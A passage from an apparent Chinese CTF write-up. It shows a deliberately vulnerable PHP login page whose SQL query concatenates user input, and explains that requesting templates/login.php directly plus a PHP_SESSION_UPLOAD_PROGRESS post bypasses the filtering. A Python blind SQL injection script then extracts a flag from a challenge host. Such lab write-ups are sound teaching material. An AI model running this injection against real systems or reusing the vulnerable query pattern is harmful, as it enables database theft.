class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_POST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) AND <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;register&quot;</span> AND <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> AND <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) AND <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) AND @<span class="keyword">include</span>(<span class="string">&#x27;templates/register.php&#x27;</span>);</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) AND <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;login&quot;</span> AND <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span> AND <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) AND <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) AND @<span class="keyword">include</span>(<span class="string">&#x27;templates/login.php&#x27;</span>);</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) AND <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;home&quot;</span> AND @<span class="keyword">include</span>(<span class="string">&#x27;templates/home.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;robots&quot;</span> content=<span class="string">&quot;noindex&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Login/Register&lt;/title&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span></span><br><span class="line">          id=<span class="string">&quot;bootstrap-css&quot;</span>&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//code.jquery.com/jquery-1.10.2.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        window.alert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> defaultCSS = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;bootstrap-css&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">changeCSS</span>(<span class="params">css</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (css) $(<span class="string">&#x27;head &gt; link&#x27;</span>).<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;:first&#x27;</span>).<span class="title function_ invoke__">replaceWith</span>(<span class="string">&#x27;&lt;link rel=&quot;stylesheet&quot; href=&quot;&#x27;</span> + css + <span class="string">&#x27;&quot; type=&quot;text/css&quot; /&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> $(<span class="string">&#x27;head &gt; link&#x27;</span>).<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;:first&#x27;</span>).<span class="title function_ invoke__">replaceWith</span>(defaultCSS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $(document).<span class="title function_ invoke__">ready</span>(function () &#123;</span><br><span class="line">            <span class="keyword">var</span> iframe_height = <span class="title function_ invoke__">parseInt</span>($(<span class="string">&#x27;html&#x27;</span>).<span class="title function_ invoke__">height</span>());</span><br><span class="line">            window.<span class="built_in">parent</span>.<span class="title function_ invoke__">postMessage</span>(iframe_height, <span class="string">&#x27;http://bootsnipp.com&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">span12</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;&quot; <span class="title">id</span>=&quot;<span class="title">loginModal</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">modal</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">button</span>&quot; <span class="title">class</span>=&quot;<span class="title">close</span>&quot; <span class="title">data</span>-<span class="title">dismiss</span>=&quot;<span class="title">modal</span>&quot; <span class="title">aria</span>-<span class="title">hidden</span>=&quot;<span class="title">true</span>&quot;&gt;×&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;<span class="title">Have</span> <span class="title">an</span> <span class="title">Account</span>?&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">modal</span>-<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">well</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">nav</span>-<span class="title">tabs</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#<span class="title">login</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#<span class="title">create</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Create</span> <span class="title">Account</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">myTabContent</span>&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">tab</span>-<span class="title">pane</span> <span class="title">active</span> <span class="title">in</span>&quot; <span class="title">id</span>=&quot;<span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">form</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">horizontal</span>&quot; <span class="title">method</span>=&quot;<span class="title">GET</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">                                        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">legend</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                            &lt;<span class="title">legend</span> <span class="title">class</span>=&quot;&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">                                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">control</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                            &lt;!-- <span class="title">Username</span> --&gt;</span></span><br><span class="line"><span class="class">                                            &lt;<span class="title">label</span> <span class="title">class</span>=&quot;<span class="title">control</span>-<span class="title">label</span>&quot; <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">controls</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;&quot;</span></span><br><span class="line"><span class="class">                                                       <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">xlarge</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">p</span>&quot; <span class="title">value</span>=&quot;<span class="title">login</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">                                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">control</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                            &lt;!-- <span class="title">Password</span>--&gt;</span></span><br><span class="line"><span class="class">                                            &lt;<span class="title">label</span> <span class="title">class</span>=&quot;<span class="title">control</span>-<span class="title">label</span>&quot; <span class="title">for</span>=&quot;<span class="title">password</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">controls</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;&quot;</span></span><br><span class="line"><span class="class">                                                       <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">xlarge</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">control</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                            &lt;!-- <span class="title">Button</span> --&gt;</span></span><br><span class="line"><span class="class">                                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">controls</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">success</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">tab</span>-<span class="title">pane</span> <span class="title">fade</span>&quot; <span class="title">id</span>=&quot;<span class="title">create</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">label</span>&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">reg</span>-<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">reg</span>-<span class="title">username</span>&quot; <span class="title">value</span>=&quot;&quot; <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">xlarge</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">label</span>&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">reg</span>-<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">reg</span>-<span class="title">password</span>&quot; <span class="title">value</span>=&quot;&quot; <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">xlarge</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">button</span> <span class="title">id</span>=&quot;<span class="title">reg</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">onclick</span>=&quot;<span class="title">register</span>();&quot;&gt;<span class="title">Create</span> <span class="title">Account</span></span></span><br><span class="line"><span class="class">                                    &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">br</span>/&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">register</span>-<span class="title">msg</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        <span class="title">function</span> <span class="title">register</span>() </span>&#123;</span><br><span class="line">            $.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                <span class="attr">url</span>: <span class="string">&quot;?p=register&quot;</span>,</span><br><span class="line">                <span class="attr">data</span>: <span class="string">&quot;username=&quot;</span> + $(<span class="string">&quot;#reg-username&quot;</span>).<span class="title function_ invoke__">val</span>() + <span class="string">&quot;&amp;password=&quot;</span> + $(<span class="string">&quot;#reg-password&quot;</span>).<span class="title function_ invoke__">val</span>(),</span><br><span class="line">                success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (data.<span class="title function_ invoke__">indexOf</span>(<span class="string">&#x27;successfully&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> msg2 = <span class="string">&#x27;&lt;div class=&quot;alert alert-success&quot; id=&quot;msg-verify&quot; role=&quot;alert&quot;&gt;&lt;strong&gt;&#x27;</span> + data + <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        $(<span class="string">&quot;#msg-verify&quot;</span>).<span class="title function_ invoke__">remove</span>();</span><br><span class="line">                        $(<span class="string">&quot;#register-msg&quot;</span>).<span class="title function_ invoke__">append</span>(msg2);</span><br><span class="line">                        $(<span class="string">&quot;#msg-verify&quot;</span>).<span class="title function_ invoke__">delay</span>(<span class="number">3200</span>).<span class="title function_ invoke__">fadeOut</span>(<span class="number">2000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (data.<span class="title function_ invoke__">indexOf</span>(<span class="string">&#x27;paranoid&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> msg2 = <span class="string">&#x27;&lt;div class=&quot;alert alert-warning&quot; id=&quot;msg-verify&quot; role=&quot;alert&quot;&gt;&lt;strong&gt;&#x27;</span> + data + <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        $(<span class="string">&quot;#msg-verify&quot;</span>).<span class="title function_ invoke__">remove</span>();</span><br><span class="line">                        $(<span class="string">&quot;#register-msg&quot;</span>).<span class="title function_ invoke__">append</span>(msg2);</span><br><span class="line">                        $(<span class="string">&quot;#msg-verify&quot;</span>).<span class="title function_ invoke__">delay</span>(<span class="number">3200</span>).<span class="title function_ invoke__">fadeOut</span>(<span class="number">2000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (data.<span class="title function_ invoke__">indexOf</span>(<span class="string">&#x27;Error&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> msg2 = <span class="string">&#x27;&lt;div class=&quot;alert alert-info&quot; id=&quot;msg-verify&quot; role=&quot;alert&quot;&gt;&lt;strong&gt;&#x27;</span> + data + <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        $(<span class="string">&quot;#msg-verify&quot;</span>).<span class="title function_ invoke__">remove</span>();</span><br><span class="line">                        $(<span class="string">&quot;#register-msg&quot;</span>).<span class="title function_ invoke__">append</span>(msg2);</span><br><span class="line">                        $(<span class="string">&quot;#msg-verify&quot;</span>).<span class="title function_ invoke__">delay</span>(<span class="number">3200</span>).<span class="title function_ invoke__">fadeOut</span>(<span class="number">2000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;!-- /source.zip --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot; and password=&quot;&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> AND <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>() AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="title function_ invoke__">auth</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]) AND <span class="keyword">die</span>(<span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span>)) <span class="title function_ invoke__">OR</span> (<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>主要就这两个文件，其中第一个文件使用了session_start开启session，并且通过p参数包含templates，然后会对get、post等参数做addslah处理，这样看起来是无懈可击的<br>但是我们其实是可以直接访问<code>templates/login.php</code>，直接访问就涉及到另一个问题了，那就是session会没掉。因为直接访问是不会开启session_start的，因此这里我们得利用session_upload_progress这个tips，当POST参数有这个数据时，就会自动的session_start一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://5b7d7949-c24c-4dce-91f3-467360a330e1.node4.buuoj.cn:81/templates/login.php&#x27;</span></span><br><span class="line">files=&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">130</span>):</span><br><span class="line">        params=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&#x27;test&quot; or (ascii(substr((select group_concat(secret) from flag_tbl),&#x27;</span>+<span class="built_in">str</span>(b)+<span class="string">&#x27;,1))=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)#&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">        a=requests.post(url=url,files=files,data=data,cookies=cookies,params=params).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;meta&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            res+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>因此写个脚本简单跑一下就出结果拉</p>
<h1 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h1><p>考点：一眼丁真的SQL注入。Java反序列化<br>开局给源码</p>
